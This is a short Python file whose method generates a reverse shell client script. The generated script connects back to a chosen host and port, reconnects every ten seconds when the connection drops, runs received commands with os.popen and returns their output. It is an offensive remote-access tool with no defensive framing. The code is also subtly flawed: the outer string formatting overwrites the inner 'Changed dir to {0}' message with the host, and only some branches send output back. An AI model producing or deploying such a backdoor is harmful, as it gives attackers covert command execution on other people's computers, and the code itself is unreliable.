class Functions(object):

    def create_client_file(self, filename, host, port):

        file_content = """
import os, socket, time


class Client(object):

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __call__(self):
        try:
            self.sock.connect((self.host, self.port))
        except Exception as e:
            pass

    def send_data(self, data):
        self.sock.sendall(data)

    def recv_data(self, buffsize=1024):
        return self.sock.recv(buffsize)

    def close(self):
        self.sock.close()


while True:
    try:
        client = Client("{0}", {1})
        client()



        while True:
            data = client.recv_data().decode()

            try:
                if len(data.split(' ')) == 2 and data.split(' ')[0] == "cd":
                    path = data.split(' ')[1]
                    os.chdir(path)
                    output = "Changed dir to {0}".format(path)
                elif data == "pwd" or data == "cwd":
                    cwd = os.getcwd()
                    output = cwd
                else:
                    output = os.popen(data).read()

                    client.send_data(output.encode())
            except:
                continue
    except:
        time.sleep(10)
        continue
        """.format(host, port)

        filename += ".py"
        f = open(filename, "w")
        f.write(file_content)
        f.close()